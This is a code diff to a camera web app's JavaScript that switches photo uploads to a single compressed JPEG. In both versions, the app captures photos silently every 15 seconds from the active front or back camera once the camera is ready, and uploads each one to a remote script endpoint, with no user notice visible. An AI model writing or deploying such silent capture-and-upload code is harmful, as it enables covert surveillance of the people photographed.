@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (Auto Capture 15 sec, Reset on Manual)
+// app.js – Pro Camera PWA (Compressed Only – Single Upload)
 // ================================================================
 
 (function() {
@@ -57,13 +57,13 @@
   var zoomSwipeStartX = 0;
   var zoomSwipeStartVal = 1;
   var isProcessing = false;
-  var autoCaptureTimer = null;        // ✅ Timer reference for reset
+  var autoCaptureTimer = null;
   var lastUserCaptureTime = 0;
   var isAutoCaptureRunning = false;
   var lastPhotoData = null;
   var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
-  var autoCaptureCount = 0;           // ✅ Count auto captures per minute
-  var autoCaptureStartTime = 0;       // ✅ Start time for minute tracking
+  var autoCaptureCount = 0;
+  var autoCaptureStartTime = 0;
 
   var focalLengths = { 0.5: 13, 1: 26, 3: 78, 7: 180, 10: 240, 50: 1200 };
 
@@ -165,47 +165,52 @@
     }
   }
 
-  // ---------- Upload ----------
-  async function uploadPhoto(entry, type) {
+  // ---------- Upload (Single Image – Compressed) ----------
+  async function uploadPhoto(entry) {
     try {
       if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
         console.error('[Camera] ❌ GAS_URL not set!');
         return false;
       }
+
+      // ✅ Compressed image मात्र पठाउने (Original हटाइयो)
       var payload = {
-        action: type === 'compressed' ? 'upload_compressed' : 'upload_original',
+        action: 'upload_photo',  // ✅ Single action
         photoId: entry.photoId,
-        image: type === 'compressed' ? entry.compressed : entry.original,
-        fileName: type === 'compressed' ? entry.compressedFileName : entry.fileName,
+        image: entry.image,      // ✅ Compressed JPEG
+        fileName: entry.fileName,
         createdAt: entry.createdAt || new Date().toISOString(),
         captureType: entry.captureType || 'manual',
         cameraType: entry.cameraType || 'back'
       };
+
       var resp = await fetch(GAS_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'text/plain' },
         body: JSON.stringify(payload)
       });
+
       if (!resp.ok) {
         var errorText = await resp.text();
-        console.error('[Camera] ❌ ' + type + ' upload error:', resp.status, errorText);
+        console.error('[Camera] ❌ Upload error:', resp.status, errorText);
         return false;
       }
+
       var result = await resp.json();
       if (result.success) {
-        console.log('[Camera] ✅ ' + type + ' uploaded:', entry.fileName);
+        console.log('[Camera] ✅ Uploaded:', entry.fileName);
         return true;
       } else {
-        console.error('[Camera] ❌ ' + type + ' upload failed:', result.error);
+        console.error('[Camera] ❌ Upload failed:', result.error);
         return false;
       }
     } catch (err) {
-      console.error('[Camera] ❌ ' + type + ' upload error:', err);
+      console.error('[Camera] ❌ Upload error:', err);
       return false;
     }
   }
 
-  // ---------- Process Queue ----------
+  // ---------- Process Queue (Single Upload) ----------
   async function processQueue() {
     if (isProcessing) return;
     if (!navigator.onLine) { console.log('[Camera] 🔴 Offline'); return; }
@@ -215,18 +220,18 @@
       if (pending.length === 0) { isProcessing = false; return; }
       console.log('[Camera] 📤 Processing ' + pending.length + ' photos...');
 
-      var compressedPromises = pending.map(function(entry) {
-        return uploadPhoto(entry, 'compressed');
+      var uploadPromises = pending.map(function(entry) {
+        return uploadPhoto(entry);
       });
-      var compressedResults = await Promise.all(compressedPromises);
+      var results = await Promise.all(uploadPromises);
 
-      var originalPromises = [];
       var toRemove = [];
       for (var i = 0; i < pending.length; i++) {
-        if (compressedResults[i]) {
-          originalPromises.push(uploadPhoto(pending[i], 'original'));
+        if (results[i]) {
+          toRemove.push(pending[i].photoId);
+          console.log('[Camera] 🎉 Uploaded:', pending[i].fileName);
         } else {
-          console.warn('[Camera] ⏳ Compressed failed for:', pending[i].fileName);
+          console.warn('[Camera] ⏳ Upload failed for:', pending[i].fileName);
           var delay = Math.min(Math.pow(2, (pending[i].retryCount || 0)), 60) * 1000;
           pending[i].retryCount = (pending[i].retryCount || 0) + 1;
           pending[i].lastAttempt = Date.now();
@@ -234,24 +239,15 @@
           setTimeout(function() { if (navigator.onLine) processQueue(); }, delay);
         }
       }
-      var originalResults = await Promise.all(originalPromises);
 
-      var idx = 0;
-      for (var j = 0; j < pending.length; j++) {
-        if (compressedResults[j] && originalResults[idx]) {
-          toRemove.push(pending[j].photoId);
-          console.log('[Camera] 🎉 Both uploaded:', pending[j].fileName);
-          idx++;
-        }
-      }
-      for (var k = 0; k < toRemove.length; k++) {
-        await removeFromQueue(toRemove[k]);
+      for (var j = 0; j < toRemove.length; j++) {
+        await removeFromQueue(toRemove[j]);
       }
     } catch (e) { console.error('[Camera] ❌ Queue error:', e); }
     isProcessing = false;
   }
 
-  // ---------- Silent Capture ----------
+  // ---------- Silent Capture (Compressed Only) ----------
   async function silentCapture(stream, cameraType, captureType) {
     if (!stream) return;
     captureType = captureType || 'auto';
@@ -279,14 +275,13 @@
     tempCtx.drawImage(tempVideo, 0, 0, vw, vh);
     tempCtx.filter = 'none';
 
-    var originalData = tempCanvas.toDataURL('image/png');
-    var compressedData = tempCanvas.toDataURL('image/jpeg', 0.3);
+    // ✅ Original PNG हटाइयो – Compressed JPEG मात्र
+    var imageData = tempCanvas.toDataURL('image/jpeg', 0.3);
 
     var timestamp = Date.now();
     var photoId = generatePhotoId();
     var cameraLabel = cameraType === 'back' ? 'BACK' : 'FRONT';
-    var fileName = captureType + '_' + cameraLabel + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
-    var compressedFileName = fileName.replace('.png', '_comp.jpg');
+    var fileName = captureType + '_' + cameraLabel + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.jpg';
 
     tempVideo.pause();
     tempVideo.srcObject = null;
@@ -294,10 +289,8 @@
 
     var entry = {
       photoId: photoId,
-      original: originalData,
-      compressed: compressedData,
+      image: imageData,
       fileName: fileName,
-      compressedFileName: compressedFileName,
       createdAt: new Date().toISOString(),
       retryCount: 0,
       lastAttempt: null,
@@ -319,7 +312,7 @@
     }
   }
 
-  // ---------- Auto Capture Logic (NEW: 15 sec, Reset on Manual) ----------
+  // ---------- Auto Capture Logic ----------
   function startAutoCapture() {
     if (isAutoCaptureRunning) return;
     if (!isCameraReady || !currentPreviewStream) {
@@ -331,33 +324,26 @@
     autoCaptureStartTime = Date.now();
     console.log('[Camera] ⏰ Auto-capture started (15s interval, reset on manual capture)');
 
-    // ✅ पहिलो फोटो तुरुन्तै खिच्ने
+    // ✅ पहिलो फोटो तुरुन्तै
     captureAutoPhoto();
-
-    // ✅ हरेक 15 सेकेन्डमा auto capture (तर manual capture ले reset गर्छ)
     scheduleNextAutoCapture();
   }
 
-  // ✅ Auto Capture को लागि Timer Schedule गर्ने
   function scheduleNextAutoCapture() {
-    // पुरानो timer रद्द गर्ने
     if (autoCaptureTimer) {
       clearTimeout(autoCaptureTimer);
       autoCaptureTimer = null;
     }
 
     autoCaptureTimer = setTimeout(function() {
-      // १ मिनेट (६० सेकेन्ड) मा अधिकतम ४ वटा Auto Capture (प्रत्येक १५ सेकेन्ड)
       var elapsed = Date.now() - autoCaptureStartTime;
       if (elapsed >= 60000) {
-        // १ मिनेट भयो, count reset गर्ने
         autoCaptureCount = 0;
         autoCaptureStartTime = Date.now();
       }
 
       if (autoCaptureCount >= 4) {
-        console.log('[Camera] ⏰ Max 4 auto captures per minute reached. Waiting for next minute.');
-        // अर्को मिनेटको लागि पर्खने
+        console.log('[Camera] ⏰ Max 4 auto captures per minute. Waiting for next minute.');
         var waitTime = 60000 - elapsed;
         if (waitTime > 0) {
           autoCaptureTimer = setTimeout(function() {
@@ -370,48 +356,40 @@
         return;
       }
 
-      // User ले १५ सेकेन्डभन्दा अगाडि Manual Capture गरेको छ कि छैन Check
       var timeSinceUserCapture = Date.now() - lastUserCaptureTime;
       if (timeSinceUserCapture < 15000) {
-        // User ले १५ सेकेन्डभित्र Manual Capture गर्यो → Timer Reset
-        console.log('[Camera] ⏳ User captured manually, resetting auto-capture timer');
+        console.log('[Camera] ⏳ User captured manually, resetting timer');
         scheduleNextAutoCapture();
         return;
       }
 
-      // ✅ Auto Capture
       captureAutoPhoto();
-
-      // अर्को capture को लागि schedule
       scheduleNextAutoCapture();
-    }, 15000); // 15 सेकेन्ड
+    }, 15000);
   }
 
-  // ✅ Auto Capture Photo function (Active Camera बाट)
   function captureAutoPhoto() {
     var activeCameraType = userFacingMode === 'environment' ? 'back' : 'front';
     var activeStream = userFacingMode === 'environment' ? backStream : frontStream;
 
     if (activeStream) {
       autoCaptureCount++;
-      console.log('[Camera] 📸 Auto capture #' + autoCaptureCount + ' from active camera:', activeCameraType);
+      console.log('[Camera] 📸 Auto capture #' + autoCaptureCount + ' from:', activeCameraType);
       silentCapture(activeStream, activeCameraType, 'auto');
     } else {
-      console.warn('[Camera] ⚠️ Active camera stream not available for auto-capture');
+      console.warn('[Camera] ⚠️ Active camera stream not available');
     }
   }
 
-  // ---------- Manual Capture (Reset Auto Capture Timer) ----------
+  // ---------- Manual Capture (Compressed Only) ----------
   async function capturePhoto() {
     if (!isCameraReady) return;
     flashScreen();
 
-    // ✅ Manual Capture गर्दा lastUserCaptureTime Update गर्ने (Timer Reset को लागि)
     lastUserCaptureTime = Date.now();
 
-    // ✅ Manual Capture गर्दा auto-capture timer reset गर्ने (15 सेकेन्ड पछि मात्र अर्को auto capture)
     if (isAutoCaptureRunning) {
-      console.log('[Camera] 🔄 Manual capture detected, resetting auto-capture timer');
+      console.log('[Camera] 🔄 Manual capture – resetting auto-capture timer');
       scheduleNextAutoCapture();
     }
 
@@ -431,28 +409,26 @@
     ctx.filter = 'none';
     ctx.setTransform(1, 0, 0, 1, 0, 0);
 
-    var originalData = canvas.toDataURL('image/png');
-    var compressedData = canvas.toDataURL('image/jpeg', 0.3);
+    // ✅ Original PNG हटाइयो – Compressed JPEG मात्र
+    var imageData = canvas.toDataURL('image/jpeg', 0.3);
 
     var timestamp = Date.now();
     var photoId = generatePhotoId();
-    var fileName = 'MANUAL_' + (cameraType === 'back' ? 'BACK' : 'FRONT') + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
-    var compressedFileName = fileName.replace('.png', '_comp.jpg');
+    var fileName = 'MANUAL_' + (cameraType === 'back' ? 'BACK' : 'FRONT') + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.jpg';
 
+    // Gallery (Fly Animation) को लागि original को सट्टा compressed use गर्ने
     var img = new Image();
     img.onload = function() { flyToGallery(img); };
-    img.src = originalData;
+    img.src = imageData;
 
-    lastPhotoData = { original: originalData, compressed: compressedData, fileName: fileName, photoId: photoId };
-    galleryImg.src = originalData;
+    lastPhotoData = { image: imageData, fileName: fileName, photoId: photoId };
+    galleryImg.src = imageData;
     galleryImg.style.display = 'block';
 
     var entry = {
       photoId: photoId,
-      original: originalData,
-      compressed: compressedData,
+      image: imageData,
       fileName: fileName,
-      compressedFileName: compressedFileName,
       createdAt: new Date().toISOString(),
       retryCount: 0,
       lastAttempt: null,
@@ -533,7 +509,7 @@
   function viewLastPhoto() {
     if (lastPhotoData) {
       var img = document.createElement('img');
-      img.src = lastPhotoData.original;
+      img.src = lastPhotoData.image;
       img.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;object-fit:contain;background:#000;z-index:999;cursor:pointer;';
       img.onclick = function() { img.remove(); };
       document.body.appendChild(img);
@@ -779,7 +755,6 @@
 
     console.log('[Camera] ✅ Camera ready!');
 
-    // ✅ Camera Ready भएपछि Auto Capture Start
     startAutoCapture();
 
     if (navigator.onLine) {
